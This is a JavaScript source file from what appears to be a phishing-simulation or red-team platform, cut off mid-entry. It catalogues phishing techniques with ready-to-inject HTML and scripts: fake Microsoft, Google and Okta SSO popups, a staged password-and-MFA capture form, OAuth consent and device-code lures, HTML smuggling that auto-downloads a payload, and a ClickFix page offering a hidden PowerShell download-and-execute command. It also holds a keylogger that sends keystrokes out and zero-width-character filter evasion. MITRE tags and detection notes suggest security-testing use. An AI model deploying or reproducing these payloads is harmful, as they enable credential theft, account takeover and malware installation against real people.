import {
  __esm
} from "./chunk-KFQGP6VL.js";

// server/lib/phishing-exploits.ts
function matchPhishingExploits(params) {
  const results = [];
  for (const exploit of PHISHING_EXPLOITS) {
    let score = 0;
    const reasons = [];
    score += exploit.effectiveness * 5;
    if (params.usesSSO && ["cred-bitb-sso", "cred-oauth-consent", "cred-device-code"].includes(exploit.id)) {
      score += 30;
      reasons.push("Target uses SSO authentication");
    }
    if (params.usesMfa && exploit.category === "mfa_bypass") {
      score += 25;
      reasons.push("Target uses MFA \u2014 bypass techniques highly relevant");
    }
    if (params.idpProvider) {
      const idpExploits = {
        microsoft: ["cred-bitb-sso", "cred-device-code", "cred-oauth-consent", "mfa-aitm-proxy", "post-email-rule"],
        google: ["cred-bitb-sso", "cred-oauth-consent", "mfa-aitm-proxy"],
        okta: ["cred-bitb-sso", "mfa-aitm-proxy"]
      };
      if (idpExploits[params.idpProvider]?.includes(exploit.id)) {
        score += 20;
        reasons.push(`Optimized for ${params.idpProvider} environment`);
      }
    }
    if (params.hasWebmail && exploit.category === "credential_harvesting") {
      score += 15;
      reasons.push("Webmail detected \u2014 credential harvesting highly effective");
    }
    const highValueSectors = ["financial", "healthcare", "government", "technology"];
    if (highValueSectors.includes(params.sector.toLowerCase())) {
      if (exploit.enablesRemoteAccess) {
        score += 10;
        reasons.push(`High-value sector (${params.sector}) \u2014 remote access exploits prioritized`);
      }
    }
    if (params.campaignType === "credential_harvest" && exploit.category === "credential_harvesting") {
      score += 20;
      reasons.push("Matches campaign type: credential harvesting");
    }
    if (params.campaignType === "payload_delivery" && exploit.category === "payload_delivery") {
      score += 20;
      reasons.push("Matches campaign type: payload delivery");
    }
    if (exploit.category === "email_evasion") {
      score += 10;
      reasons.push("Email evasion techniques improve deliverability");
    }
    if (score >= 30) {
      results.push({
        exploit,
        relevanceScore: Math.min(100, score),
        matchReason: reasons.join("; ")
      });
    }
  }
  results.sort((a, b) => b.relevanceScore - a.relevanceScore);
  return results;
}
function getExploitsByCategory(category) {
  return PHISHING_EXPLOITS.filter((e) => e.category === category);
}
function getExploitsForTarget(target) {
  return PHISHING_EXPLOITS.filter((e) => e.target === target || e.target === "both");
}
function enhanceLandingPage(baseHtml, exploitIds) {
  let enhanced = baseHtml;
  const injections = [];
  for (const id of exploitIds) {
    const exploit = PHISHING_EXPLOITS.find((e) => e.id === id);
    if (!exploit?.landingPageCode) continue;
    injections.push(`
<!-- Injected: ${exploit.name} (${exploit.mitreId}) -->
${exploit.landingPageCode}`);
  }
  if (injections.length > 0) {
    const injection = injections.join("\n");
    if (enhanced.includes("</body>")) {
      enhanced = enhanced.replace("</body>", `${injection}
</body>`);
    } else {
      enhanced += injection;
    }
  }
  return enhanced;
}
function enhanceEmailTemplate(baseHtml, exploitIds) {
  let enhanced = baseHtml;
  for (const id of exploitIds) {
    const exploit = PHISHING_EXPLOITS.find((e) => e.id === id);
    if (!exploit?.emailTemplateCode) continue;
    if (id === "evasion-zero-width") {
      const keywords = ["password", "verify", "urgent", "account", "security", "login", "confirm"];
      for (const kw of keywords) {
        const obfuscated = kw.split("").join("&#8203;");
        enhanced = enhanced.replace(new RegExp(`(?<=>)([^<]*)(${kw})([^<]*)(?=<)`, "gi"), (match, before, word, after) => {
          return `${before}${obfuscated}${after}`;
        });
      }
    }
  }
  return enhanced;
}
function getPhishingMitreTechniques() {
  const techniques = /* @__PURE__ */ new Map();
  for (const exploit of PHISHING_EXPLOITS) {
    const existing = techniques.get(exploit.mitreId);
    if (existing) {
      existing.exploitCount++;
    } else {
      techniques.set(exploit.mitreId, {
        id: exploit.mitreId,
        name: exploit.mitreName,
        tactic: exploit.mitreTactic,
        exploitCount: 1
      });
    }
  }
  return Array.from(techniques.values()).sort((a, b) => b.exploitCount - a.exploitCount);
}
var PHISHING_EXPLOITS, EXPLOIT_CATEGORIES;
var init_phishing_exploits = __esm({
  "server/lib/phishing-exploits.ts"() {
    PHISHING_EXPLOITS = [
      // ═══════════════════════════════════════════════════════════════════
      // CREDENTIAL HARVESTING
      // ═══════════════════════════════════════════════════════════════════
      {
        id: "cred-bitb-sso",
        name: "Browser-in-the-Browser (BITB) SSO Popup",
        category: "credential_harvesting",
        difficulty: "advanced",
        description: "Creates a fake browser popup window within the landing page that mimics a legitimate SSO login (Microsoft, Google, Okta). The popup looks like a real browser window with a convincing URL bar, SSL padlock, and familiar login form. Captures credentials when the user 'authenticates' in the fake popup.",
        mitreId: "T1556.006",
        mitreName: "Modify Authentication Process: Multi-Factor Authentication",
        mitreTactic: "Credential Access",
        target: "landing_page",
        landingPageCode: `<!-- BITB SSO Popup - Browser-in-the-Browser -->
<div id="bitb-overlay" style="display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.5);z-index:9999;justify-content:center;align-items:center;">
  <div id="bitb-window" style="width:420px;background:#fff;border-radius:8px;box-shadow:0 25px 50px rgba(0,0,0,0.3);overflow:hidden;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;">
    <!-- Fake browser chrome -->
    <div style="background:#f0f0f0;padding:8px 12px;display:flex;align-items:center;border-bottom:1px solid #ddd;">
      <div style="display:flex;gap:6px;margin-right:12px;">
        <span style="width:12px;height:12px;border-radius:50%;background:#ff5f57;display:inline-block;cursor:pointer;" onclick="document.getElementById('bitb-overlay').style.display='none'"></span>
        <span style="width:12px;height:12px;border-radius:50%;background:#febc2e;display:inline-block;"></span>
        <span style="width:12px;height:12px;border-radius:50%;background:#28c840;display:inline-block;"></span>
      </div>
      <div style="flex:1;background:#fff;border-radius:20px;padding:4px 12px;font-size:13px;color:#333;display:flex;align-items:center;border:1px solid #ccc;">
        <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#28a745" stroke-width="2" style="margin-right:6px;"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
        <span id="bitb-url" style="color:#333;">login.microsoftonline.com</span>
      </div>
    </div>
    <!-- Fake login form -->
    <div style="padding:40px 30px;">
      <div style="text-align:center;margin-bottom:24px;">
        <img id="bitb-logo" src="https://img-prod-cms-rt-microsoft-com.akamaized.net/cms/api/am/imageFileData/RE1Mu3b?ver=5c31" style="height:24px;" alt="Microsoft">
        <h2 style="font-size:20px;font-weight:600;margin:16px 0 4px;color:#1b1b1b;">Sign in</h2>
        <p style="font-size:13px;color:#666;margin:0;">to continue to your account</p>
      </div>
      <form method="POST" id="bitb-form">
        <input type="email" name="email" placeholder="Email, phone, or Skype" required style="width:100%;padding:10px 12px;border:1px solid #666;border-radius:4px;font-size:15px;margin-bottom:16px;box-sizing:border-box;outline:none;" onfocus="this.style.borderColor='#0078d4'" onblur="this.style.borderColor='#666'">
        <input type="password" name="password" placeholder="Password" required style="width:100%;padding:10px 12px;border:1px solid #666;border-radius:4px;font-size:15px;margin-bottom:8px;box-sizing:border-box;outline:none;" onfocus="this.style.borderColor='#0078d4'" onblur="this.style.borderColor='#666'">
        <div style="text-align:left;margin-bottom:20px;">
          <a href="#" style="font-size:13px;color:#0067b8;text-decoration:none;">Forgot password?</a>
        </div>
        <button type="submit" style="width:100%;padding:10px;background:#0078d4;color:#fff;border:none;border-radius:4px;font-size:15px;font-weight:600;cursor:pointer;">Sign in</button>
      </form>
      <p style="text-align:center;font-size:12px;color:#666;margin-top:20px;">No account? <a href="#" style="color:#0067b8;text-decoration:none;">Create one!</a></p>
    </div>
  </div>
</div>
<script>
// Trigger BITB popup after a short delay or on button click
function showBITB(provider) {
  var providers = {
    microsoft: { url: 'login.microsoftonline.com', logo: 'https://img-prod-cms-rt-microsoft-com.akamaized.net/cms/api/am/imageFileData/RE1Mu3b?ver=5c31' },
    google: { url: 'accounts.google.com/signin', logo: 'https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png' },
    okta: { url: 'login.okta.com', logo: '' }
  };
  var p = providers[provider] || providers.microsoft;
  document.getElementById('bitb-url').textContent = p.url;
  if (p.logo) document.getElementById('bitb-logo').src = p.logo;
  document.getElementById('bitb-overlay').style.display = 'flex';
}
</script>`,
        configOptions: {
          provider: { type: "select", default: "microsoft", description: "SSO provider to mimic (microsoft, google, okta)" },
          autoTrigger: { type: "boolean", default: "true", description: "Auto-show popup after page load delay" },
          triggerDelay: { type: "number", default: "2000", description: "Delay in ms before auto-showing popup" }
        },
        detectionIndicators: [
          "Fake browser chrome rendered as HTML/CSS within page",
          "URL bar is not a real browser address bar (inspect element reveals div)",
          "Window cannot be dragged outside the browser viewport",
          "Right-click context menu differs from real browser popup"
        ],
        prerequisites: ["Landing page hosted on HTTPS", "Target uses SSO authentication"],
        tags: ["sso", "credential-capture", "microsoft", "google", "okta", "browser-in-browser"],
        enablesRemoteAccess: true,
        effectiveness: 9
      },
      {
        id: "cred-progressive-mfa",
        name: "Progressive MFA Capture Form",
        category: "credential_harvesting",
        difficulty: "intermediate",
        description: "Multi-step credential capture that first collects username/email, then password, then MFA code in separate steps \u2014 mimicking real Microsoft/Google authentication flows. Each step is timed to appear realistic with loading spinners between steps.",
        mitreId: "T1556.006",
        mitreName: "Modify Authentication Process: Multi-Factor Authentication",
        mitreTactic: "Credential Access",
        target: "landing_page",
        landingPageCode: `<!-- Progressive MFA Capture -->
<div id="mfa-capture" style="max-width:400px;margin:60px auto;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;">
  <div style="text-align:center;margin-bottom:30px;">
    <h2 style="font-size:22px;color:#1b1b1b;">Verify your identity</h2>
    <p style="color:#666;font-size:14px;">Additional verification required for security</p>
  </div>
  <!-- Step 1: Email -->
  <div id="step-email" style="display:block;">
    <label style="font-size:13px;color:#333;display:block;margin-bottom:6px;">Email address</label>
    <input type="email" id="cap-email" name="email" style="width:100%;padding:10px;border:1px solid #ccc;border-radius:4px;font-size:15px;box-sizing:border-box;" placeholder="user@company.com">
    <button onclick="nextStep('password')" style="width:100%;margin-top:16px;padding:10px;background:#0078d4;color:#fff;border:none;border-radius:4px;font-size:15px;cursor:pointer;">Next</button>
  </div>
  <!-- Step 2: Password -->
  <div id="step-password" style="display:none;">
    <div id="show-email" style="font-size:14px;color:#0078d4;margin-bottom:16px;"></div>
    <label style="font-size:13px;color:#333;display:block;margin-bottom:6px;">Password</label>
    <input type="password" id="cap-password" name="password" style="width:100%;padding:10px;border:1px solid #ccc;border-radius:4px;font-size:15px;box-sizing:border-box;" placeholder="Enter password">
    <button onclick="nextStep('mfa')" style="width:100%;margin-top:16px;padding:10px;background:#0078d4;color:#fff;border:none;border-radius:4px;font-size:15px;cursor:pointer;">Sign in</button>
  </div>
  <!-- Step 3: MFA -->
  <div id="step-mfa" style="display:none;">
    <div style="text-align:center;margin-bottom:20px;">
      <div style="width:60px;height:60px;border-radius:50%;background:#e8f4fd;margin:0 auto 12px;display:flex;align-items:center;justify-content:center;font-size:28px;">\u{1F510}</div>
      <p style="font-size:14px;color:#333;">Enter the code from your authenticator app</p>
    </div>
    <input type="text" id="cap-mfa" name="mfa_code" maxlength="6" style="width:100%;padding:14px;border:1px solid #ccc;border-radius:4px;font-size:24px;text-align:center;letter-spacing:8px;box-sizing:border-box;" placeholder="______">
    <button onclick="submitAll()" style="width:100%;margin-top:16px;padding:10px;background:#0078d4;color:#fff;border:none;border-radius:4px;font-size:15px;cursor:pointer;">Verify</button>
    <p style="text-align:center;font-size:12px;color:#666;margin-top:12px;">Didn't receive a code? <a href="#" style="color:#0078d4;">Try another method</a></p>
  </div>
  <!-- Loading spinner -->
  <div id="step-loading" style="display:none;text-align:center;padding:40px;">
    <div style="border:3px solid #f3f3f3;border-top:3px solid #0078d4;border-radius:50%;width:30px;height:30px;animation:spin 1s linear infinite;margin:0 auto;"></div>
    <p style="color:#666;margin-top:12px;font-size:14px;">Verifying...</p>
  </div>
  <style>@keyframes spin{0%{transform:rotate(0)}100%{transform:rotate(360deg)}}</style>
</div>
<script>
function nextStep(step) {
  var steps = ['email','password','mfa','loading'];
  steps.forEach(function(s){document.getElementById('step-'+s).style.display='none';});
  document.getElementById('step-loading').style.display='block';
  if(step==='password') document.getElementById('show-email').textContent=document.getElementById('cap-email').value;
  setTimeout(function(){
    document.getElementById('step-loading').style.display='none';
    document.getElementById('step-'+step).style.display='block';
  }, 1200);
}
function submitAll() {
  var form = document.createElement('form');
  form.method = 'POST';
  ['email','password','mfa_code'].forEach(function(f){
    var inp = document.createElement('input');
    inp.type = 'hidden';
    inp.name = f;
    inp.value = document.getElementById('cap-'+(f==='mfa_code'?'mfa':f)).value;
    form.appendChild(inp);
  });
  document.getElementById('step-mfa').style.display='none';
  document.getElementById('step-loading').style.display='block';
  document.body.appendChild(form);
  form.submit();
}
</script>`,
        configOptions: {
          includeMfa: { type: "boolean", default: "true", description: "Include MFA code capture step" },
          mfaType: { type: "select", default: "totp", description: "MFA type to mimic (totp, push, sms)" }
        },
        detectionIndicators: [
          "Multi-step form on non-corporate domain",
          "MFA code submitted to non-IdP endpoint",
          "Form action URL does not match displayed SSO provider"
        ],
        prerequisites: ["Target organization uses MFA"],
        tags: ["mfa", "credential-capture", "multi-step", "totp", "progressive"],
        enablesRemoteAccess: true,
        effectiveness: 8
      },
      {
        id: "cred-oauth-consent",
        name: "OAuth Consent Phishing (Illicit Consent Grant)",
        category: "credential_harvesting",
        difficulty: "advanced",
        description: "Instead of stealing credentials directly, tricks the user into granting OAuth permissions to a malicious application. The landing page mimics an OAuth consent screen requesting access to email, contacts, and files. Once granted, the attacker has persistent API access without needing the user's password.",
        mitreId: "T1528",
        mitreName: "Steal Application Access Token",
        mitreTactic: "Credential Access",
        target: "landing_page",
        landingPageCode: `<!-- OAuth Consent Phishing -->
<div style="max-width:440px;margin:40px auto;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;background:#fff;border-radius:8px;box-shadow:0 2px 20px rgba(0,0,0,0.1);overflow:hidden;">
  <div style="padding:30px;text-align:center;border-bottom:1px solid #eee;">
    <div style="width:48px;height:48px;background:#0078d4;border-radius:8px;margin:0 auto 12px;display:flex;align-items:center;justify-content:center;color:#fff;font-size:24px;">\u{1F4CB}</div>
    <h2 style="font-size:18px;margin:0 0 4px;color:#1b1b1b;">Permissions requested</h2>
    <p style="font-size:13px;color:#666;margin:0;">SecureDoc Viewer wants to access your account</p>
  </div>
  <div style="padding:20px 30px;">
    <p style="font-size:13px;color:#333;margin:0 0 16px;">This app would like to:</p>
    <div style="space-y:12px;">
      <div style="display:flex;align-items:center;gap:12px;padding:8px 0;border-bottom:1px solid #f0f0f0;">
        <span style="font-size:20px;">\u{1F4E7}</span>
        <div><strong style="font-size:13px;">Read your email</strong><p style="font-size:12px;color:#666;margin:2px 0 0;">Access email messages in your mailbox</p></div>
      </div>
      <div style="display:flex;align-items:center;gap:12px;padding:8px 0;border-bottom:1px solid #f0f0f0;">
        <span style="font-size:20px;">\u{1F465}</span>
        <div><strong style="font-size:13px;">Read your contacts</strong><p style="font-size:12px;color:#666;margin:2px 0 0;">Access your contact list and address book</p></div>
      </div>
      <div style="display:flex;align-items:center;gap:12px;padding:8px 0;border-bottom:1px solid #f0f0f0;">
        <span style="font-size:20px;">\u{1F4C1}</span>
        <div><strong style="font-size:13px;">Read your files</strong><p style="font-size:12px;color:#666;margin:2px 0 0;">Access files in your OneDrive and SharePoint</p></div>
      </div>
      <div style="display:flex;align-items:center;gap:12px;padding:8px 0;">
        <span style="font-size:20px;">\u{1F464}</span>
        <div><strong style="font-size:13px;">Sign you in and read your profile</strong><p style="font-size:12px;color:#666;margin:2px 0 0;">Read your basic profile information</p></div>
      </div>
    </div>
    <div style="background:#fff8e1;border:1px solid #ffcc02;border-radius:4px;padding:10px;margin:16px 0;font-size:12px;color:#666;">
      \u26A0\uFE0F Accepting these permissions allows this app to access your data. Only accept if you trust this app.
    </div>
    <form method="POST">
      <input type="hidden" name="consent" value="granted">
      <input type="hidden" name="scope" value="mail.read contacts.read files.read user.read">
      <button type="submit" style="width:100%;padding:10px;background:#0078d4;color:#fff;border:none;border-radius:4px;font-size:15px;cursor:pointer;margin-bottom:8px;">Accept</button>
      <button type="button" onclick="window.location='{{.URL}}'" style="width:100%;padding:10px;background:#f0f0f0;color:#333;border:1px solid #ccc;border-radius:4px;font-size:15px;cursor:pointer;">Cancel</button>
    </form>
  </div>
</div>`,
        configOptions: {
          appName: { type: "string", default: "SecureDoc Viewer", description: "Name of the fake OAuth application" },
          permissions: { type: "string", default: "mail.read,contacts.read,files.read", description: "Comma-separated list of requested permissions" }
        },
        detectionIndicators: [
          "OAuth consent request from unrecognized application",
          "Application requesting broad permissions (mail, files, contacts)",
          "Consent page hosted on non-Microsoft/Google domain"
        ],
        prerequisites: ["Target uses Microsoft 365 or Google Workspace"],
        tags: ["oauth", "consent", "token-theft", "persistent-access", "microsoft365"],
        enablesRemoteAccess: true,
        effectiveness: 9
      },
      {
        id: "cred-device-code",
        name: "Device Code Phishing (OAuth Device Flow)",
        category: "credential_harvesting",
        difficulty: "advanced",
        description: "Exploits the OAuth 2.0 device authorization flow. The phishing email directs the user to microsoft.com/devicelogin (a legitimate Microsoft page) and provides a device code. When the user enters the code, they unknowingly authorize the attacker's session. This is extremely effective because the user authenticates on a real Microsoft page.",
        mitreId: "T1528",
        mitreName: "Steal Application Access Token",
        mitreTactic: "Credential Access",
        target: "both",
        emailTemplateCode: `<!-- Device Code Phishing Email Enhancement -->
<div style="background:#f8f9fa;border:1px solid #e0e0e0;border-radius:8px;padding:20px;margin:20px 0;font-family:'Segoe UI',sans-serif;">
  <div style="display:flex;align-items:center;gap:10px;margin-bottom:12px;">
    <span style="font-size:24px;">\u{1F510}</span>
    <strong style="font-size:15px;">Device Verification Required</strong>
  </div>
  <p style="font-size:14px;color:#333;margin:0 0 12px;">To complete the security verification, please follow these steps:</p>
  <ol style="font-size:14px;color:#333;padding-left:20px;">
    <li>Go to <a href="https://microsoft.com/devicelogin" style="color:#0078d4;">microsoft.com/devicelogin</a></li>
    <li>Enter this code: <span style="background:#0078d4;color:#fff;padding:4px 12px;border-radius:4px;font-family:monospace;font-size:16px;font-weight:bold;letter-spacing:2px;">DEVICE_CODE</span></li>
    <li>Sign in with your work account</li>
  </ol>
  <p style="font-size:12px;color:#999;margin:12px 0 0;">This code expires in 15 minutes. If you did not request this, please contact IT immediately.</p>
</div>`,
        landingPageCode: `<!-- Device Code Landing Page (instruction page) -->
<div style="max-width:500px;margin:60px auto;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;text-align:center;">
  <div style="margin-bottom:30px;">
    <div style="width:80px;height:80px;background:#e8f4fd;border-radius:50%;margin:0 auto 16px;display:flex;align-items:center;justify-content:center;font-size:36px;">\u{1F510}</div>
    <h1 style="font-size:24px;color:#1b1b1b;margin:0 0 8px;">Device Verification</h1>
    <p style="color:#666;font-size:15px;">Complete the verification to access your account</p>
  </div>
  <div style="background:#f0f7ff;border:2px solid #0078d4;border-radius:12px;padding:24px;margin-bottom:24px;">
    <p style="font-size:14px;color:#333;margin:0 0 8px;">Your verification code:</p>
    <div style="font-size:36px;font-weight:bold;font-family:monospace;color:#0078d4;letter-spacing:6px;margin:8px 0;">ABCD1234</div>
    <p style="font-size:12px;color:#999;margin:8px 0 0;">Expires in <span id="countdown">14:59</span></p>
  </div>
  <a href="https://microsoft.com/devicelogin" target="_blank" style="display:inline-block;background:#0078d4;color:#fff;padding:14px 40px;border-radius:6px;text-decoration:none;font-size:16px;font-weight:600;">Open Microsoft Login \u2192</a>
  <p style="font-size:13px;color:#666;margin-top:20px;">Enter the code above after signing in with your work account.</p>
</div>
<script>
var t=899;setInterval(function(){if(t<=0)return;t--;var m=Math.floor(t/60),s=t%60;document.getElementById('countdown').textContent=m+':'+(s<10?'0':'')+s;},1000);
</script>`,
        configOptions: {
          deviceCode: { type: "string", default: "ABCD1234", description: "The device code to display (generated by attacker's OAuth flow)" }
        },
        detectionIndicators: [
          "Email directing user to microsoft.com/devicelogin with a code",
          "Unusual device code authentication from unexpected location",
          "Token issued to unrecognized application after device code auth"
        ],
        prerequisites: ["Target uses Azure AD / Entra ID", "Attacker has initiated device code flow"],
        tags: ["oauth", "device-code", "azure-ad", "token-theft", "microsoft"],
        enablesRemoteAccess: true,
        effectiveness: 10
      },
      // ═══════════════════════════════════════════════════════════════════
      // PAYLOAD DELIVERY
      // ═══════════════════════════════════════════════════════════════════
      {
        id: "payload-html-smuggling",
        name: "HTML Smuggling Payload Delivery",
        category: "payload_delivery",
        difficulty: "advanced",
        description: "Embeds a base64-encoded payload within the HTML email or landing page. When the user opens the page, JavaScript reconstructs the payload as a downloadable file (e.g., .iso, .zip, .hta) and triggers an automatic download. Bypasses email gateway scanning because the payload is assembled client-side.",
        mitreId: "T1027.006",
        mitreName: "Obfuscated Files or Information: HTML Smuggling",
        mitreTactic: "Defense Evasion",
        target: "landing_page",
        landingPageCode: `<!-- HTML Smuggling Payload Delivery -->
<div id="smuggle-ui" style="max-width:500px;margin:60px auto;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;text-align:center;">
  <div style="margin-bottom:24px;">
    <div style="width:64px;height:64px;background:#e8f4fd;border-radius:12px;margin:0 auto 12px;display:flex;align-items:center;justify-content:center;font-size:32px;">\u{1F4C4}</div>
    <h2 style="font-size:20px;color:#1b1b1b;margin:0 0 4px;">Secure Document Ready</h2>
    <p style="color:#666;font-size:14px;">Your document is being prepared for download...</p>
  </div>
  <div id="smuggle-progress" style="background:#f0f0f0;border-radius:8px;height:8px;margin:20px 0;overflow:hidden;">
    <div id="smuggle-bar" style="background:#0078d4;height:100%;width:0%;transition:width 2s ease;border-radius:8px;"></div>
  </div>
  <p id="smuggle-status" style="font-size:13px;color:#666;">Decrypting document...</p>
</div>
<script>
(function(){
  // Simulated payload - replace PAYLOAD_B64 with actual base64 content
  var payloadB64 = 'PAYLOAD_B64_PLACEHOLDER';
  var fileName = 'SecureDocument.zip';
  var mimeType = 'application/zip';
  
  var bar = document.getElementById('smuggle-bar');
  var status = document.getElementById('smuggle-status');
  
  setTimeout(function(){ bar.style.width = '30%'; status.textContent = 'Verifying integrity...'; }, 500);
  setTimeout(function(){ bar.style.width = '70%'; status.textContent = 'Preparing download...'; }, 1500);
  setTimeout(function(){
    bar.style.width = '100%';
    status.textContent = 'Download starting...';
    
    // Reconstruct and trigger download
    try {
      var bytes = atob(payloadB64);
      var arr = new Uint8Array(bytes.length);
      for(var i=0;i<bytes.length;i++) arr[i] = bytes.charCodeAt(i);
      var blob = new Blob([arr], {type: mimeType});
      var url = URL.createObjectURL(blob);
      var a = document.createElement('a');
      a.href = url;
      a.download = fileName;
      document.body.appendChild(a);
      a.click();
      URL.revokeObjectURL(url);
      status.innerHTML = '\u2705 Download complete. <a href="#" onclick="location.reload()">Download again</a>';
    } catch(e) {
      status.textContent = 'Download ready. Click below to save.';
    }
  }, 2500);
})();
</script>`,
        configOptions: {
          payloadBase64: { type: "string", default: "", description: "Base64-encoded payload content" },
          fileName: { type: "string", default: "SecureDocument.zip", description: "Download filename" },
          mimeType: { type: "string", default: "application/zip", description: "MIME type of the payload" }
        },
        detectionIndicators: [
          "JavaScript creating Blob objects from base64 data",
          "Automatic file download triggered without user click",
          "Large base64 strings embedded in HTML source"
        ],
        prerequisites: ["Payload prepared and base64 encoded"],
        tags: ["html-smuggling", "payload-delivery", "download", "evasion"],
        enablesRemoteAccess: true,
        effectiveness: 8
      },
      {
        id: "payload-clickfix",
        name: "ClickFix Social Engineering",
        category: "payload_delivery",
        difficulty: "intermediate",
        description: "Mimics a broken document/page that instructs the user to 'fix' the issue by copying and pasting a command into their terminal or Run dialog. The command downloads and executes a payload. Extremely effective because the user voluntarily executes the command, bypassing most security controls.",
        mitreId: "T1204.002",
        mitreName: "User Execution: Malicious File",
        mitreTactic: "Execution",
        target: "landing_page",
        landingPageCode: `<!-- ClickFix Social Engineering -->
<div style="max-width:600px;margin:40px auto;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;">
  <!-- Fake error state -->
  <div style="background:#fff;border:1px solid #e0e0e0;border-radius:8px;overflow:hidden;">
    <div style="background:#f8d7da;padding:16px 20px;border-bottom:1px solid #f5c6cb;">
      <div style="display:flex;align-items:center;gap:8px;">
        <span style="font-size:20px;">\u26A0\uFE0F</span>
        <strong style="color:#721c24;">Document Rendering Error</strong>
      </div>
    </div>
    <div style="padding:24px;text-align:center;">
      <div style="background:#f8f9fa;border:2px dashed #dee2e6;border-radius:8px;padding:40px;margin-bottom:20px;">
        <span style="font-size:48px;opacity:0.3;">\u{1F4C4}</span>
        <p style="color:#666;margin:12px 0 0;">This document requires a browser component that is not installed.</p>
      </div>
      <div style="background:#e8f4fd;border:1px solid #bee5eb;border-radius:8px;padding:16px;text-align:left;">
        <p style="font-size:14px;color:#333;margin:0 0 12px;"><strong>How to fix:</strong></p>
        <ol style="font-size:13px;color:#333;margin:0;padding-left:20px;">
          <li>Press <kbd style="background:#eee;padding:2px 6px;border-radius:3px;border:1px solid #ccc;font-size:12px;">Win + R</kbd> to open the Run dialog</li>
          <li>Copy and paste the command below</li>
          <li>Click OK to install the required component</li>
        </ol>
        <div style="background:#1e1e1e;color:#d4d4d4;padding:12px;border-radius:4px;margin-top:12px;font-family:monospace;font-size:13px;position:relative;cursor:pointer;" onclick="copyCmd(this)">
          <span id="clickfix-cmd">powershell -w hidden -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('PAYLOAD_URL')"</span>
          <span style="position:absolute;right:8px;top:8px;background:#333;padding:4px 8px;border-radius:3px;font-size:11px;color:#aaa;">\u{1F4CB} Click to copy</span>
        </div>
        <p style="font-size:11px;color:#999;margin:8px 0 0;">This installs the Microsoft Document Rendering Engine v4.2.1</p>
      </div>
    </div>
  </div>
</div>
<script>
function copyCmd(el) {
  var cmd = document.getElementById('clickfix-cmd').textContent;
  navigator.clipboard.writeText(cmd).then(function(){
    el.querySelector('span:last-child').textContent = '\u2705 Copied!';
    setTimeout(function(){ el.querySelector('span:last-child').textContent = '\u{1F4CB} Click to copy'; }, 2000);
  });
}
</script>`,
        configOptions: {
          payloadUrl: { type: "string", default: "PAYLOAD_URL", description: "URL of the payload to download and execute" },
          errorMessage: { type: "string", default: "Document Rendering Error", description: "Fake error message to display" }
        },
        detectionIndicators: [
          "Page instructing user to run commands in terminal/Run dialog",
          "PowerShell or curl commands displayed on webpage",
          "Clipboard API used to copy command strings"
        ],
        prerequisites: ["Payload hosted on accessible URL", "Target uses Windows"],
        tags: ["clickfix", "social-engineering", "powershell", "execution", "user-interaction"],
        enablesRemoteAccess: true,
        effectiveness: 9
      },
      {
        id: "payload-qr-phishing",
        name: "QR Code Phishing (Quishing)",
        category: "payload_delivery",
        difficulty: "basic",
        description: "Embeds a QR code in the phishing email that redirects to the credential capture landing page. Effective because QR codes bypass URL scanning in email gateways and force the user to their mobile device where security controls are typically weaker.",
        mitreId: "T1566.002",
        mitreName: "Phishing: Spearphishing Link",
        mitreTactic: "Initial Access",
        target: "email_template",
        emailTemplateCode: `<!-- QR Code Phishing Enhancement -->
<div style="text-align:center;margin:24px 0;padding:24px;background:#f8f9fa;border-radius:8px;">
  <p style="font-size:14px;color:#333;margin:0 0 16px;"><strong>Scan to verify your identity</strong></p>
  <div style="display:inline-block;padding:16px;background:#fff;border-radius:8px;box-shadow:0 2px 8px rgba(0,0,0,0.1);">
    <!-- QR code placeholder - generate with actual URL -->
    <img src="https://api.qrserver.com/v1/create-qr-code/?size=200x200&data={{.URL}}" alt="Scan QR Code" style="width:200px;height:200px;">
  </div>
  <p style="font-size:12px;color:#666;margin:12px 0 0;">Can't scan? <a href="{{.URL}}" style="color:#0078d4;">Click here instead</a></p>
  <p style="font-size:11px;color:#999;margin:4px 0 0;">Use your phone camera or authenticator app to scan</p>
</div>`,
        configOptions: {
          qrSize: { type: "number", default: "200", description: "QR code size in pixels" },
          includeTextLink: { type: "boolean", default: "true", description: "Include fallback text link below QR" }
        },
        detectionIndicators: [
          "QR code embedded in email body",
          "QR code URL points to non-corporate domain",
          "Email instructs scanning QR code for authentication"
        ],
        prerequisites: [],
        tags: ["qr-code", "quishing", "mobile", "email-evasion"],
        enablesRemoteAccess: false,
        effectiveness: 7
      },
      // ═══════════════════════════════════════════════════════════════════
      // LANDING PAGE EXPLOITS
      // ═══════════════════════════════════════════════════════════════════
      {
        id: "lp-keylogger",
        name: "JavaScript Keylogger Injection",
        category: "landing_page_exploit",
        difficulty: "intermediate",
        description: "Injects a hidden JavaScript keylogger into the landing page that captures all keystrokes, including passwords typed into form fields. Data is exfiltrated via beacon requests to the GoPhish tracking endpoint. Captures credentials even if the user doesn't submit the form.",
        mitreId: "T1056.001",
        mitreName: "Input Capture: Keylogging",
        mitreTactic: "Collection",
        target: "landing_page",
        landingPageCode: `<!-- Keylogger Injection (append to any landing page) -->
<script>
(function(){
  var buf='',timer=null,endpoint='{{.URL}}';
  function send(){
    if(!buf)return;
    var img=new Image();
    img.src=endpoint+'?k='+encodeURIComponent(buf)+'&t='+Date.now();
    buf='';
  }
  document.addEventListener('keypress',function(e){
    buf+=e.key;
    clearTimeout(timer);
    timer=setTimeout(send,2000);
  });
  document.addEventListener('paste',function(e){
    var p=(e.clipboardData||window.clipboardData).getData('text');
    buf+='[PASTE:'+p+']';
    clearTimeout(timer);
    timer=setTimeout(send,1000);
  });
  // Also capture on form field focus changes
  document.addEventListener('focusout',function(e){
    if(e.target.tagName==='INPUT'||e.target.tagName==='TEXTAREA'){
      buf+='[FIELD:'+e.target.name+'='+e.target.value+']';
      send();
    }
  });
})();
</script>`,
        configOptions: {
          exfilEndpoint: { type: "string", default: "{{.URL}}", description: "Endpoint to send captured keystrokes" },
